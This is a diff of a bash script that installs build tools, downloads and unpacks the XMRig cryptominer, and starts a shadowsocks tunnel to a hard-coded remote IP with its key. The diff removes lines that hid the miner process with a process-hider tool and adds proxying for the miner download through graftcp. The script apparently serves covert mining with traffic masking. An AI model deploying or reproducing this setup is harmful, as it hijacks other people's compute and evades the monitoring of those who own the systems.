@@ -1,10 +1,5 @@
 #!/bin/bash
-sudo su && sudo apt update;apt upgrade -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-
-npm i -g node-process-hider && npm install -g npm
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
@@ -30,11 +25,9 @@ sleep .2
 echo " "
 echo " "
 
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+./graftcp/graftcp wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xf xmrig-6.17.0-linux-x64.tar.gz
 
 apt -y install shadowsocks-libev rng-tools
 
 ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
-
-sudo ph add xmrig
